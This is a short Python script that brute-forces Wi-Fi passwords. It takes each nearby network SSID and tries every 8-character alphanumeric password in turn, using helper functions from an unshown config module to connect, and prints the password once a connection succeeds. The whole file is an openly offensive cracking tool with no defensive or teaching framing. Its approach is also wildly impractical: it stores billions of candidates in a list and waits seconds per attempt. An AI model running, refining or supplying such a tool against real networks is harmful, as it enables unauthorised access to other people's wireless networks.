from config import *
import time


def searchWIFI(ssid):
    arr = [
        "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"
    ]
    bigArray = []
    for d1 in arr:
        for d2 in arr:
            for d3 in arr:
                for d4 in arr:
                    for d5 in arr:
                        for d6 in arr:
                            for d7 in arr:
                                for d8 in arr:
                                    pasw = d1+d2+d3+d4+d5+d6+d7+d8
                                    print(ssid + ' : ' + pasw)
                                    if mkSense(pasw):
                                        setWIFI(ssid, pasw)
                                        time.sleep(5)
                                        if is_connected():
                                            print('>>>> ' + SSIDPASS(ssid))
                                            print('\nDone!')
                                            return 0
                                    else:
                                        bigArray.append(pasw)
    for pasw in bigArray:
        print(f'# {ssid}' + ' : ' + pasw)
        setWIFI(ssid, pasw)
        time.sleep(5)
        if is_connected():
            print('>>>> ' + SSIDPASS(ssid))
            print('\nDone!')
            return 0

search = ARRSSID()
for ssid in search:
    searchWIFI(ssid)